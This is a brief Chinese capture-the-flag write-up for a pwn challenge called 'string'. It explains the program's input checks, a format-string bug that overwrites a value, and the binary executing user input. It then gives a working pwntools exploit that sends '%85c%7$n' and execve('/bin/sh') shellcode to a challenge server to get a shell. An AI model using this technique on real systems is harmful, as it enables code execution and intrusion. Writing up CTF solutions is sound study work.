# string

趁着今天下午一个人在工地，把前几天的wp给写一下

这一题首先给出了v3的地址，在最后需要*v3与v3[1]的值相等才能继续操作

第一步的检查是在sub_400A7D中，必须输入east才能进入下一函数，接下来就是sub_400BB9中需要首先输入1才能继续

再后面有一个格式化字符串的漏洞，直接printf输出我们输入的字符串，通过修改*v3的值使其与v3[1]相等

最后则是直接讲我们输入的字符串作为函数运行，这里直接输入shellcode即可get shell

exp:

```python
from pwn import *

#n = process('./string')
n = remote('111.198.29.45',43380)
elf = ELF('./string')
context.log_level = 'debug'

n.recvuntil('secret[0] is ')
v3_addr = int(n.recvuntil('\n')[:-1],16)
print(hex(v3_addr))
n.recvuntil('name be:\n')
n.sendline('a')
n.recvuntil('up?:')
n.sendline('east')
n.recvuntil('leave(0)?:')
n.sendline('1')
n.recvuntil("address'")
n.sendline(str(v3_addr))
n.recvuntil('is:')
n.sendline("%85c%7$n")
n.recvuntil('USE YOU SPELL')
n.sendline("\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05")
n.interactive()
```

